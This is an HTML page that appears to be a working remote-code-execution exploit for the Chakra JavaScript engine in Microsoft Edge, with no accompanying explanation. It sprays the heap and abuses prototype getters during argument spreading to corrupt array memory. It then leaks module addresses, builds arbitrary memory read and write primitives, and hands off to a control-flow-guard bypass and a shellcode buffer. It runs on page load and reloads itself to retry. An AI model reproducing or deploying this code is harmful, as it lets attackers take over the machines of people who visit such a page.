<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta http-equiv="Expires" content="0" />
<meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate" />
<meta http-equiv="Cache-Control" content="post-check=0, pre-check=0" />
<meta http-equiv="Pragma" content="no-cache" />
<meta http-equiv="Expires" content="Wed, 26 Feb 1997 08:21:57 GMT" />
<script type="text/javascript" src="Exploit.js"></script>
<script>
ADDR_LOW = 0
ADDR_HIGH = 1
chakra_addr = [0, 0]
ntdll_addr = [0, 0]
arraybuf = null
arraybuf_addr = [0, 0]
arraybuf_buf_addr = [0, 0]
offset_JavascriptNativeIntArray_vtable = 0x00593100
offset_JavascriptArray_vtable = 0x00593450
offset_Uint32Array_vtable = 0x005873e0 //chakra!Js::TypedArray<unsigned int,0,0>::`vftable'

shellcode_size = 0x50000

fake_obj = null
fake_obj_addr = [0, 0]
big_arr = null
uint32arr = null

function addr64_add(high, low, offset) {
  low += offset
  if (low >= 0x100000000) {
    low -= 0x100000000
    high += 1
  }
  return [low, high]
}

function addr64_sub(high, low, offset) {
  low -= offset
  if (low < 0) {
    low += 0x100000000
    high -= 1
  }
  return [low, high]
}

function int2uint(v) {
  return v < 0 ? 0x100000000+v:v
}

function uint2int(v) {
  return v >= 0x80000000 ? -(0x100000000-v) : v
}

function spray() {
  spray_count = 100
  spray_arr = new Array(spray_count)
  for(var i=0; i < spray_count; i++) {
    spray_arr[i] = new Array(0x3a016666,i,0x11111111,0x11111111,0x11111111,0x11111111,0x11111111,0x11111111,0x11111111,0x11111111)
  }

  for(var i=0; i < spray_count; i++) {
    spray_arr[i].length = 0x76543210
  }
  rewrite_arr = spray_arr[30]
  bigarrs = null
}

function getter_last() {

  bigarr_index = -1
  nextarr_index = -1
  base_index = 10

  for(var i=0; i < spray_count; i++) {
    if (spray_arr[i][0] == 0x7a016666) {
        bigarr_index = i
        break
    }
  }
  
  if (bigarr_index == -1) {
    return 1
  }

  for (var i=base_index; i < spray_count*32; i+=32) {

    if ( spray_arr[bigarr_index][i + 22] == 0x3a016666 
      && spray_arr[bigarr_index][i + 8] == 0x76543210
      && spray_arr[bigarr_index][i + 16] == 0
      && spray_arr[bigarr_index][i + 17] == 0xa
      && spray_arr[bigarr_index][i + 18] == 0xa
    ) {
        base_index = i
        nextarr_index = spray_arr[bigarr_index][i + 23]
        break
    }
    
  }

  if (nextarr_index == -1) {

    return 1
  }

  fake_obj = spray_arr[nextarr_index]
  big_arr = spray_arr[bigarr_index]

  chakra_addr[ADDR_LOW] = int2uint(big_arr[base_index])
  chakra_addr[ADDR_HIGH] = int2uint(big_arr[base_index+1])
  chakra_addr = addr64_sub(chakra_addr[ADDR_HIGH], chakra_addr[ADDR_LOW], offset_JavascriptNativeIntArray_vtable)
  
  fake_obj_addr[ADDR_LOW] = int2uint(big_arr[base_index+10])
  fake_obj_addr[ADDR_HIGH] = int2uint(big_arr[base_index+11])
  fake_obj_addr = addr64_sub(fake_obj_addr[ADDR_HIGH], fake_obj_addr[ADDR_LOW], 0x40)
  //alert("chakra:" + chakra_addr[ADDR_HIGH].toString(16) + chakra_addr[ADDR_LOW].toString(16))

  var jsarr_vtable = addr64_add(chakra_addr[ADDR_HIGH], chakra_addr[ADDR_LOW], offset_JavascriptArray_vtable)
  big_arr[base_index] = uint2int(jsarr_vtable[ADDR_LOW])
  big_arr[base_index+1] = uint2int(jsarr_vtable[ADDR_HIGH])

  arraybuf = new ArrayBuffer(shellcode_size)
  fake_obj[0] = arraybuf
  arraybuf_addr[ADDR_LOW] = int2uint(big_arr[base_index+22])
  arraybuf_addr[ADDR_HIGH] = int2uint(big_arr[base_index+23])

  uint32arr =  new Uint32Array(2)
  var tmp_u32_addr = [0, 0]
  fake_obj[0] = uint32arr
  tmp_u32_addr[ADDR_LOW] = int2uint(big_arr[base_index+22])
  tmp_u32_addr[ADDR_HIGH] = int2uint(big_arr[base_index+23])

  boom_u32arr = new WeakSet()
  var boom_u32arr_addr = [0, 0]
  fake_obj[0] = boom_u32arr
  boom_u32arr_addr[ADDR_LOW] = int2uint(big_arr[base_index+22])
  boom_u32arr_addr[ADDR_HIGH] = int2uint(big_arr[base_index+23])

  var intarr_vtable = addr64_add(chakra_addr[ADDR_HIGH], chakra_addr[ADDR_LOW], offset_JavascriptNativeIntArray_vtable)
  big_arr[base_index] = uint2int(intarr_vtable[ADDR_LOW])
  big_arr[base_index+1] = uint2int(intarr_vtable[ADDR_HIGH])

  big_arr[base_index+10] = uint2int(tmp_u32_addr[ADDR_LOW])
  big_arr[base_index+11] = uint2int(tmp_u32_addr[ADDR_HIGH])
  big_arr[base_index+12] = uint2int(tmp_u32_addr[ADDR_LOW])
  big_arr[base_index+13] = uint2int(tmp_u32_addr[ADDR_HIGH])
  big_arr[base_index+14] = uint2int(tmp_u32_addr[ADDR_LOW])
  big_arr[base_index+15] = uint2int(tmp_u32_addr[ADDR_HIGH])

  target_index_base = (chakra_addr[ADDR_LOW] + offset_Uint32Array_vtable)
  if (target_index_base >= 0x100000000) {
    target_index_base -= 0x100000000
  }
  
var write_dword = function(high, low, value, offset) {
  if (offset == undefined) {
    offset = 0
  }

  if (offset >= 0) {
    low += offset
    if (low < 0x100000000) {
      fake_obj[target_index_base+8] = uint2int(low)
      fake_obj[target_index_base+9] = uint2int(high)
    } else {
      low -= 0x100000000
      fake_obj[target_index_base+8] = uint2int(low)
      high += 1
      fake_obj[target_index_base+9] = uint2int(high)
    }
  } else {
    if (low + offset >= 0) {
      low += offset
      fake_obj[target_index_base+8] = uint2int(low)
      fake_obj[target_index_base+9] = uint2int(high)
    } else {
      low += offset
      low += 0x100000000
      fake_obj[target_index_base+8] = uint2int(low)
      high -= 1
      fake_obj[target_index_base+9] = uint2int(high)
    }
  }
  uint32arr[0] = value
}

var read_dword = function(high, low, offset) {
  if (offset == undefined) {
    offset = 0
  }

  if (offset >= 0) {
    low += offset
    if (low < 0x100000000) {
      fake_obj[target_index_base+8] = uint2int(low)
      fake_obj[target_index_base+9] = uint2int(high)
    } else {
      low -= 0x100000000
      fake_obj[target_index_base+8] = uint2int(low)
      high += 1
      fake_obj[target_index_base+9] = uint2int(high)
    }
  } else {
    if (low + offset >= 0) {
      low += offset
      fake_obj[target_index_base+8] = uint2int(low)
      fake_obj[target_index_base+9] = uint2int(high)
    } else {
      low += offset
      low += 0x100000000
      fake_obj[target_index_base+8] = uint2int(low)
      high -= 1
      fake_obj[target_index_base+9] = uint2int(high)
    }
  }
  return uint32arr[0]
}

arraybuf_buf_addr[ADDR_LOW] = read_dword(arraybuf_addr[ADDR_HIGH], arraybuf_addr[ADDR_LOW], 0x30)
arraybuf_buf_addr[ADDR_HIGH] = read_dword(arraybuf_addr[ADDR_HIGH], arraybuf_addr[ADDR_LOW], 0x34)

  bypassCFG(
    read_dword, write_dword, 
    chakra_addr, 
    boom_u32arr, boom_u32arr_addr, 
    arraybuf, arraybuf_buf_addr
  )

  return 0
}

function getter_1(){
  var shoot_index = 0x1
  var shoot_value = 0x10000
  for(var j=0; j < shoot_index+3; j++) {
    if (j == shoot_index) {
      args.push(rewrite_arr);
    } else if (j == shoot_index + 1){
      args.push(0);
    } else if (j == shoot_index + 2){
      args.push(shoot_value);
    } else {
      args.push(j);
    }
  }

  args.push(0);
  args.push(0x7a016666);
  
  cb_2 = args.length.toString()
  args[args.length+1] = 1

  args.__proto__.__proto__.__defineGetter__(cb_2, getter_last)

  return 0xdeedbeef
}

function exploit() {
  spray()
  
  function ttt(a,b,c){
  }

  args = new Array()
  args[0] = 0x0
  args[1] = 0x1
  args[2] = 0x2
  args[3] = 0xdeedbeef
  args[4] = 0xdeedbeef
  args[5] = 0xdeedbeef
  args[6] = 0xdeedbeef
  args[7] = 0xdeedbeef
  args[8] = 0xdeedbeef
  args[9] = 0xdeedbeef
  args[10] = 0xdeedbeef
  args[11] = 0xdeedbeef
  args[12] = 0xdeedbeef
  args[13] = 0xdeedbeef
  args[14] = 0xdeedbeef
  args[15] = 0xdeedbeef
  args[16] = 0xdeedbeef
  args[17] = 0xdeedbeef
  args[18] = 0xdeedbeef
  args[19] = 0xdeedbeef
  args[20] = 0xdeedbeef
  
  args.__proto__.__defineGetter__("1", getter_1)
  
  args2 = {}
  args2.__proto__[Symbol.iterator] = function(){
    delete args[1]
    return {"next": function(){ return {"done": true} } }
  }

  ttt(...args, ...args2)
}

try{
exploit()
}catch(e){}
setTimeout(function(){window.location.href = window.location.href}, 1000)

</script>
